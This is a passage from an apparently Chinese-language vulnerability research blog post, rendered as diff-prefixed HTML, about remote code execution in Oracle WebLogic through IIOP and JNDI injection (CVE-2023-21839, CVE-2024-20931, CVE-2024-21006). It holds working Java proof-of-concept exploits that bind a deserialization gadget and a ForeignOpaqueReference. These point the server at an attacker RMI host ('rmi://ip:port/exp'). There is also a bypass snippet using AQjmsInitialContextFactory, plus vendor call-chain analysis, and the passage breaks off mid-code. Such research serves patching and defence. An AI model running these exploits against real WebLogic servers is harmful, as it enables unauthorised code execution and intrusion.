+</span></span><span style="display:flex;"><span>            env.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;java.naming.factory.initial&#34;</span>, <span style="color:#e6db74">&#34;weblogic.jndi.WLInitialContextFactory&#34;</span>);
+</span></span><span style="display:flex;"><span>            env.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;java.naming.provider.url&#34;</span>, String.<span style="color:#a6e22e">format</span>(<span style="color:#e6db74">&#34;iiop://%s:%s&#34;</span>, ip, port));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            Context context <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InitialContext(env);
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// get Object to Deserialize</span>
+</span></span><span style="display:flex;"><span>            JtaTransactionManager jtaTransactionManager <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> JtaTransactionManager();
+</span></span><span style="display:flex;"><span>            jtaTransactionManager.<span style="color:#a6e22e">setUserTransactionName</span>(<span style="color:#e6db74">&#34;rmi://ip:port/Exploit&#34;</span>);
+</span></span><span style="display:flex;"><span>            Remote remote <span style="color:#f92672">=</span> Gadgets.<span style="color:#a6e22e">createMemoitizedProxy</span>(Gadgets.<span style="color:#a6e22e">createMap</span>(<span style="color:#e6db74">&#34;pwnedasd&#34;</span>, jtaTransactionManager), Remote.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;start&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            context.<span style="color:#a6e22e">bind</span>(<span style="color:#e6db74">&#34;hello&#34;</span>, remote);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception e){
+</span></span><span style="display:flex;"><span>            e.<span style="color:#a6e22e">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="cve-2023-21839">CVE-2023-21839<a hidden class="anchor" aria-hidden="true" href="#cve-2023-21839">#</a></h2>
+<blockquote>
+<p>Weblogic 12.2.1.4</p>
+<p>JDK8u65</p>
+</blockquote>
+<p>12.x可以直接从官网下载，将<code>/u01/app/oracle/middleware/wlserver</code>下的所有导入idea。</p>
+<p>也需要导入<code>wlfullclient.jar</code>，与10.3.6的生成方式不同。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cd /u01/app/oracle/middleware/wlserver/server/lib
+</span></span><span style="display:flex;"><span>/java/bin/java -jar ../../modules/com.bea.core.jarbuilder.jar 
+</span></span></code></pre></div><p>当客户端向服务器lookup对象时，服务器会调用<code>weblogic.corba.cos.naming.NamingContextImpl#resolveObject</code>方法。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> java.<span style="color:#a6e22e">lang</span>.<span style="color:#a6e22e">Object</span> <span style="color:#a6e22e">resolveObject</span>(String name) <span style="color:#66d9ef">throws</span> NamingException {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (name.<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">&#34;&#34;</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        java.<span style="color:#a6e22e">lang</span>.<span style="color:#a6e22e">Object</span> o <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getContext</span>().<span style="color:#a6e22e">lookup</span>(name);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>.........................
+</span></span></code></pre></div><p>此时的context为<code>weblogic.jndi.internal.WLContextImpl</code>，如果绑定的对象不是<code>NamingNode</code>则会调用<code>getObjectInstance</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> Object <span style="color:#a6e22e">resolveObject</span>(String name, Object obj, <span style="color:#66d9ef">int</span> mode, Hashtable env) <span style="color:#66d9ef">throws</span> NamingException {
+</span></span><span style="display:flex;"><span>    Object resolved <span style="color:#f92672">=</span> obj;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (obj <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (obj <span style="color:#66d9ef">instanceof</span> NamingNode) {
+</span></span><span style="display:flex;"><span>                resolved <span style="color:#f92672">=</span> ((NamingNode)obj).<span style="color:#a6e22e">getContext</span>(env);
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (mode <span style="color:#f92672">!=</span> 0 <span style="color:#f92672">&amp;&amp;</span> mode <span style="color:#f92672">&gt;=</span> 0) {
+</span></span><span style="display:flex;"><span>                resolved <span style="color:#f92672">=</span> WLNamingManager.<span style="color:#a6e22e">getObjectInstance</span>(obj, <span style="color:#66d9ef">new</span> CompositeName(name), (Context)<span style="color:#66d9ef">null</span>, env);
+</span></span><span style="display:flex;"><span>                resolved <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">makeTransportable</span>(resolved, name, env);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>..............
+</span></span></code></pre></div><p>如果绑定的对象是<code>OpaqueReference</code>则调用其<code>getReference</code>方法。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (boundObject <span style="color:#66d9ef">instanceof</span> OpaqueReference) {
+</span></span><span style="display:flex;"><span>    boundObject <span style="color:#f92672">=</span> ((OpaqueReference)boundObject).<span style="color:#a6e22e">getReferent</span>(name, ctx);
+</span></span></code></pre></div><p><code>weblogic.deployment.jms.ForeignOpaqueReference</code>是<code>OpaqueReference</code>的一个实现类，其<code>getReference</code>方法可以触发原生JNDI lookup，关键代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getReferent</span>(Name name, Context ctx) <span style="color:#66d9ef">throws</span> NamingException {
+</span></span><span style="display:flex;"><span>    AbstractSubject originalSubject <span style="color:#f92672">=</span> SubjectManager.<span style="color:#a6e22e">getSubjectManager</span>().<span style="color:#a6e22e">getCurrentSubject</span>(KERNEL_ID);
+</span></span><span style="display:flex;"><span>    InitialContext context;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">jndiEnvironment</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>        context <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InitialContext();
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">jndiEnvironment</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;java.naming.factory.initial&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">jndiEnvironment</span>.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;java.naming.factory.initial&#34;</span>, <span style="color:#e6db74">&#34;weblogic.jndi.WLInitialContextFactory&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        context <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InitialContext(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">jndiEnvironment</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>.....................
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Object retVal;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">jndiEnvironment</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> AQJMS_ICF.<span style="color:#a6e22e">equals</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">jndiEnvironment</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;java.naming.factory.initial&#34;</span>)) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">remoteJNDIName</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">remoteJNDIName</span>.<span style="color:#a6e22e">startsWith</span>(AQJMS_QPREFIX) <span style="color:#f92672">||</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">remoteJNDIName</span>.<span style="color:#a6e22e">startsWith</span>(AQJMS_TPREFIX))) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">synchronized</span>(<span style="color:#66d9ef">this</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">cachedReferent</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">cachedReferent</span> <span style="color:#f92672">=</span> context.<span style="color:#a6e22e">lookup</span>(evalMacros(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">remoteJNDIName</span>));
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            retVal <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">cachedReferent</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            retVal <span style="color:#f92672">=</span> context.<span style="color:#a6e22e">lookup</span>(evalMacros(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">remoteJNDIName</span>));
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">finally</span> {
+</span></span><span style="display:flex;"><span>        SubjectManager.<span style="color:#a6e22e">getSubjectManager</span>().<span style="color:#a6e22e">popSubject</span>(KERNEL_ID);
+</span></span><span style="display:flex;"><span>        context.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ................
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>当lookup一个<code>ForeignOpaqueReference</code>对象时会触发jndi lookup.</p>
+<p>remoteJNDIName属性需要反射写入，poc：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exp</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        String ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>        String port <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;7001&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ClassPool pool <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>();
+</span></span><span style="display:flex;"><span>        CtClass IOPProfileCtClass <span style="color:#f92672">=</span> pool.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;weblogic.iiop.ior.IOPProfile&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        CtMethod read <span style="color:#f92672">=</span> IOPProfileCtClass.<span style="color:#a6e22e">getDeclaredMethod</span>(<span style="color:#e6db74">&#34;read&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        String code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;this.host = \&#34;&#34;</span> <span style="color:#f92672">+</span> ip <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#34;;&#34;</span>;
+</span></span><span style="display:flex;"><span>        read.<span style="color:#a6e22e">insertAfter</span>(code);
+</span></span><span style="display:flex;"><span>        IOPProfileCtClass.<span style="color:#a6e22e">detach</span>();
+</span></span><span style="display:flex;"><span>        IOPProfileCtClass.<span style="color:#a6e22e">toClass</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Hashtable<span style="color:#f92672">&lt;</span>String, String<span style="color:#f92672">&gt;</span> env <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Hashtable<span style="color:#f92672">&lt;</span>String, String<span style="color:#f92672">&gt;</span>();
+</span></span><span style="display:flex;"><span>        env.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;java.naming.factory.initial&#34;</span>, <span style="color:#e6db74">&#34;weblogic.jndi.WLInitialContextFactory&#34;</span>);
+</span></span><span style="display:flex;"><span>        env.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;java.naming.provider.url&#34;</span>, String.<span style="color:#a6e22e">format</span>(<span style="color:#e6db74">&#34;iiop://%s:%s&#34;</span>, ip, port));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Context context <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InitialContext(env);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ForeignOpaqueReference foreignOpaqueReference <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ForeignOpaqueReference();
+</span></span><span style="display:flex;"><span>        setFieldValue(foreignOpaqueReference, <span style="color:#e6db74">&#34;remoteJNDIName&#34;</span>, <span style="color:#e6db74">&#34;rmi://ip:port/exp&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;start&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        context.<span style="color:#a6e22e">rebind</span>(<span style="color:#e6db74">&#34;helloasd&#34;</span>, foreignOpaqueReference);
+</span></span><span style="display:flex;"><span>        context.<span style="color:#a6e22e">lookup</span>(<span style="color:#e6db74">&#34;helloasd&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>直接将<code>ForeignOpaqueReference</code>rebind，接着lookup即可，还是需要用javassist修改函数才能打远程。不过12.2.1.4版本中类名从<code>weblogic.iiop.IOPProfile</code>改为了<code>weblogic.iiop.ior.IOPProfile</code>.</p>
+<h2 id="cve-2024-20931">CVE-2024-20931<a hidden class="anchor" aria-hidden="true" href="#cve-2024-20931">#</a></h2>
+<blockquote>
+<p>Weblogic 12.2.1.4</p>
+<p>JDK8u65</p>
+</blockquote>
+<p>属于<code>CVE-2023-21839</code>的绕过，补丁添加了两个过滤：</p>
+<ul>
+<li>如果jndiEnvironment中providerURL不为null会检查签名</li>
+<li>限制了JNDI的协议类型</li>
+</ul>
+<p>之前打<code>CVE-2023-21839</code>时jndiEnv为null，这次需要用jndiEnv的<code>java.naming.factory.initial</code>属性指定本地工厂类。</p>
+<p>服务器在创建上下文时会调用这个工厂类的<code>getInitialContext</code>方法。</p>
+<p>堆栈如下：</p>
+<pre tabindex="0"><code>javax.naming.spi.InitialContextFactory#getInitialContext
+javax.naming.spi.NamingManager#getInitialContext
+javax.naming.InitialContext#getDefaultInitCtx
+javax.naming.InitialContext#init
+javax.naming.InitialContext#&lt;init&gt;
+weblogic.deployment.jms.ForeignOpaqueReference#getReferent
+weblogic.jndi.internal.WLNamingManager#getObjectInstance
+weblogic.jndi.internal.BasicNamingNode#resolveObject
+weblogic.jndi.internal.BasicNamingNode#resolveObject
+weblogic.jndi.internal.BasicNamingNode#lookupSharable
+weblogic.jndi.internal.PartitionHandler#lookupSharable
+weblogic.jndi.internal.ServerNamingNode#lookup
+weblogic.jndi.internal.RootNamingNode#lookup
+weblogic.jndi.internal.WLEventContextImpl#lookup
+weblogic.jndi.internal.WLContextImpl#lookup
+javax.naming.InitialContext#lookup
+weblogic.corba.cos.naming.NamingContextImpl#resolveObject
+</code></pre><p><code>AQjmsInitialContextFactory</code>这个工厂类的<code>getInitialContext</code>方法会调用根据参数<code>dataSource</code>进行原生jndi lookup。</p>
+<p>用poc能打通，不过我这边找不到这个类在哪，所以不知道具体触发jndi的代码是什么。</p>
+<p>反射写入jndiEnv即可。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Hashtable jndiEnv <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Hashtable();
+</span></span><span style="display:flex;"><span>jndiEnv.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;java.naming.factory.initial&#34;</span>, <span style="color:#e6db74">&#34;oracle.jms.AQjmsInitialContextFactory&#34;</span>);
+</span></span><span style="display:flex;"><span>jndiEnv.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;datasource&#34;</span>, <span style="color:#e6db74">&#34;rmi://ip:port/exp&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>setFieldValue(foreignOpaqueReference, <span style="color:#e6db74">&#34;jndiEnvironment&#34;</span>, jndiEnv);
+</span></span></code></pre></div><h2 id="cve-2024-21006">CVE-2024-21006<a hidden class="anchor" aria-hidden="true" href="#cve-2024-21006">#</a></h2>
+<blockquote>
+<p>Weblogic 12.2.1.4</p>
+<p>JDK8u65</p>
+</blockquote>
+<p>漏洞的最终利用方式和<code>CVE-2023-21839</code>、<code>CVE-2024-20931</code>一致，都是利用 IIOP -&gt; JNDI 去造成远程代码执行，不过在整个触发的过程中有所不同。</p>
+<p>从<code>CVE-2024-20931</code>的调用堆栈来看，通过了<code>weblogic.jndi.internal.BasicNamingNode#lookupSharable</code>并进入了if代码块，代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> Object <span style="color:#a6e22e">lookupSharable</span>(String name, Hashtable env) <span style="color:#66d9ef">throws</span> NamingException, RemoteException {
+</span></span><span style="display:flex;"><span>    String prefix <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getPrefix</span>(name);
+</span></span><span style="display:flex;"><span>    String restOfName <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getRest</span>(name);
+</span></span><span style="display:flex;"><span>    Object object <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">lookupHere</span>(prefix, env, restOfName);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (restOfName.<span style="color:#a6e22e">length</span>() <span style="color:#f92672">==</span> 0) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (NamingDebugLogger.<span style="color:#a6e22e">isDebugEnabled</span>()) {
+</span></span><span style="display:flex;"><span>            NamingDebugLogger.<span style="color:#a6e22e">debug</span>(<span style="color:#e6db74">&#34;+++ lookupInSharable(&#34;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;, &#34;</span> <span style="color:#f92672">+</span> object.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getName</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;) succeeded&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolveObject</span>(prefix, object, env);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (object <span style="color:#66d9ef">instanceof</span> BasicNamingNode) {
+</span></span><span style="display:flex;"><span>                object <span style="color:#f92672">=</span> ((BasicNamingNode)object).<span style="color:#a6e22e">lookupSharable</span>(restOfName, env);
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                object <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getContinuationCtx</span>(object, prefix, restOfName, env).<span style="color:#a6e22e">lookup</span>(restOfName);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (NamingException var7) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">prependResolvedNameToException</span>(prefix, var7);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">makeTransportable</span>(object, restOfName, env);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>如果<code>restOfName.length() == 0</code>为真，进入else分支，让object不为<code>BasicNamingNode</code>类型会调用<code>getContinuationCtx</code></p>
+<p>有一个补丁在<code>getContinuationCtx</code>里，限制了通过HTTP codebase加载远程类。后面会调用<code>NamingManager#getContinuationContext</code>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Context <span style="color:#a6e22e">getContinuationContext</span>(CannotProceedException cpe)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throws</span> NamingException {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Hashtable<span style="color:#f92672">&lt;</span>Object,Object<span style="color:#f92672">&gt;</span> env <span style="color:#f92672">=</span> (Hashtable<span style="color:#f92672">&lt;</span>Object,Object<span style="color:#f92672">&gt;</span>)cpe.<span style="color:#a6e22e">getEnvironment</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (env <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>        env <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Hashtable<span style="color:#f92672">&lt;&gt;</span>(7);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Make a (shallow) copy of the environment.</span>
+</span></span><span style="display:flex;"><span>        env <span style="color:#f92672">=</span> (Hashtable<span style="color:#f92672">&lt;</span>Object,Object<span style="color:#f92672">&gt;</span>)env.<span style="color:#a6e22e">clone</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    env.<span style="color:#a6e22e">put</span>(CPE, cpe);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ContinuationContext cctx <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ContinuationContext(cpe, env);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> cctx.<span style="color:#a6e22e">getTargetContext</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>最终会调用到<code>javax.naming.spi.NamingManager#getObjectInstance</code>方法，这里就是原生jndi lookup调用本地工厂类的地方：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>factory <span style="color:#f92672">=</span> getObjectFactoryFromReference(ref, f);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (factory <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> factory.<span style="color:#a6e22e">getObjectInstance</span>(ref, name, nameCtx, environment);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>weblogic.application.naming.MessageDestinationObjectFactory</code>类实现了<code>ObjectFactory</code>接口，可以作为工厂类，其<code>getObjectInstance</code>方法可以触发原生jndi lookup，相当于二次jndi注入绕过限制。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getObjectInstance</span>(Object obj, Name name, Context ctx, Hashtable<span style="color:#f92672">&lt;?</span>, <span style="color:#f92672">?&gt;</span> env) <span style="color:#66d9ef">throws</span> NamingException {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(obj <span style="color:#66d9ef">instanceof</span> MessageDestinationReference)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> AssertionError(<span style="color:#e6db74">&#34;ObjectFactory should have been referenced only from EnvReference&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> ((MessageDestinationReference)obj).<span style="color:#a6e22e">lookupMessageDestination</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">lookupMessageDestination</span>() <span style="color:#66d9ef">throws</span> NamingException {
+</span></span><span style="display:flex;"><span>    InitialContext ic;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">initialContextFactory</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>        ic <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InitialContext();
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        Hashtable<span style="color:#f92672">&lt;</span>String, String<span style="color:#f92672">&gt;</span> env <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Hashtable();
+</span></span><span style="display:flex;"><span>        env.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;java.naming.factory.initial&#34;</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">initialContextFactory</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">null</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">providerURL</span>) {
+</span></span><span style="display:flex;"><span>            env.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;java.naming.provider.url&#34;</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">providerURL</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ic <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InitialContext(env);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ic.<span style="color:#a6e22e">lookup</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">jndiName</span>);
+</span></span><span style="display:flex;"><span>}
